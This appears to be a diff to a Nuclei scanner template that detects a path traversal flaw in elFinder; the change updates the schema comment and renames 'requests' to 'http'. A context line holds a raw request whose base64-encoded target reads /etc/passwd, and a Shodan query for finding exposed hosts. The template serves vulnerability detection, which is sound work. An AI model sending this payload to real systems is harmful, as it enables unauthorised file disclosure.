@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: elFinder-path-traversal
 info:
   name: elFinder - Path Traversal
@@ -11,7 +12,7 @@ info:
     verified: true
     shodan-query: title:"elfinder"
   tags: lfi,elfinder
-requests:
+http:
   - raw:
       - |
         GET /php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1 HTTP/1.1
